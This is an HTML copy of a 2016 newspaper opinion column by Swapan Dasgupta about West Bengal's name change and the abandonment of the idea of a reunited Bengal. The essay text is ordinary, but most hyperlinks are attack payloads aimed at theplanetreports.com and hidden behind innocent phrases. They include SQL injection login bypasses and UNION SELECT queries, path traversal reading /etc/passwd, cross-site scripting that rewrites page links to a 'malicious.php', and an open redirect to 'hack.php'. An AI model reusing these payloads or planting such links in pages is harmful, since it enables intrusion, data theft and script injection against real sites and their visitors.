<h2>Name change admits a reality: There’s no rewind to one Bengal</h2>

<p class="details">September 5, 2016, 12:00 am IST Swapan Dasgupta<a href="#">timesofindia</a> </p>
<h2 align="right"><a href="20160904-opinion.php"> Previous </a> </h2>
<h2 align="left"><a href="20160906-opinion.php"> Next </a> </h2>



<p>
As high school students in the <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank"> late sixties </a>, our teachers encouraged us to read the editorial pages of newspapers to both improve our language and broaden our intellectual horizons. It was then that I stumbled across a term that was in fairly common usage then: <a href="http://theplanetreports.com/traversal.php?data=cat%20../../../../../../etc/passwd" target="_blank"> irredentism. </a>
</p> <p>
Going by the Concise Oxford Dictionary, the term originated in the context of 19th century Italian politics, and suggested the demand for the restoration to a country of territories lost by it. In the Indian context, the term was liberally bandied about pejoratively to describe the Akhand Bharat yearnings of the RSS and the then Jana Sangh. They were deemed to be unreconciled to the <a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank"> Partition of India in 1947 </a> and the creation of Pakistan.
</p> <p>
An emotional attachment to the India that extended from the borders of Afghanistan and the Soviet Union to the frontiers of Tibet and Burma was one thing, grudgingly accepting the reality of a hostile neighbour was another. Most of those Hindu and Sikh refugee families that left West Pakistan and settled in different parts of northern and western India knew in their heart of hearts that their departure from their ancestral homes was final and permanent. With great enterprise and some governmental assistance they recreated their lives in India and, most important, prospered. The bitterness over the loss of Lahore, Karachi and Peshawar was dulled by the opportunities that presented themselves in India. By the late 1950s,<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">  East Punjab was quietly replaced by plain Punjab. </a> And though Sind still featured in the national anthem, the Hindu Sindhis were hardly active irredentists.
</p> <p>
Yet, people often forget that Partition didn’t happen only in the west, it was an equally traumatic phenomenon in the east. In 1905, Bengal took on the might of the British Empire to protest the division of the province. The irony is that the same partition was broadly replicated in <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> 1947, with equally horrific consequences.</a>
</p> <p>
However, there was an important difference. While the Partition in the west was accepted with a measure of finality, there was an astonishing measure of ambivalence over East Pakistan.
</p> <p>
Contemporary accounts testify that many Indian leaders believed that East Pakistan was a temporary aberration, and that sooner or later Partition would be reversed. In policy terms, this meant that the single-mindedness with which the problem of refugee rehabilitation was addressed in the west was absent in the east.<a href="http://www.theplanetreports.com/redirect.php?url=http://www.theplanetreports.com/hack.php"> The Nehru-Liaquat pact of 1950 kept </a> alive the fiction that the Hindus who had crossed over into West Bengal and Assam after Partition would return. This meant that the refugee problem in the east was left largely unaddressed. This neglect persisted despite overwhelming evidence that the minorities in East Pakistan were being pushed out in stages. Indeed, the exodus of Hindus from East Pakistan happened in phases, beginning in 1947 and continuing right until the war of 1971. The exodus hasn’t stopped even to this day. It is estimated that nearly <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank"> 400 Hindu families cross over into India </a> each month to escape persecution.
</p> <p>
It is this ambivalence and the unreal hope that the refugees would return to their ancestral homes that defined Bengali attitudes to East Pakistan and, subsequently, Bangladesh. <a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank">  The post-Independence Congress leadership </a> also looked on the ‘Bangal’ influx with wariness, seeing the refugees as political fodder for the Left parties. It was only a handful of far-sighted leaders such as Shyama Prasad Mookerjee — who led the movement to prevent Kolkata and the western districts from becoming a part of East Pakistan — that recognised that the Partition was irreversible. Consequently, the myth of West Bengal as only a wing of a composite <a href="http://www.theplanetreports.com/traversal.php?data=ls -la" target="_blank"> Sonar Bangla </a> was artificially kept alive but for no apparent reason.
</p> <p></p> <p>
The decision of the Mamata Banerjee government to drop West Bengal and substitute it with Bangla/ Bangal/ Bengal, depending on <a href="http://www.theplanetreports.com/uploads/traversal_main.php?data=cat%20/etc/passwd" target="_blank"> linguistic preference,</a> is significant. Much more important than rising in the alphabetical hierarchy of the states, the name change marks the formalisation of a reality. Today, neither the Indian state of Bengal nor the sovereign People’s Republic of Bangladesh see undivided, pre-1947 as a realistic goal. There may be cultural commonalities — a common love of Tagore and Nazrul — and even an attachment to cross-border trade — hilsa and jamdani sarees — but the idea of a common homeland temporarily on hold due to political vagaries has been abandoned. Even as India and Bangladesh move towards a stable relationship, the delusions of the past have finally been junked. <a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>" target="_blank"> Irredentism has been issued a death certificate, decades after its actual death. </a>

</p>


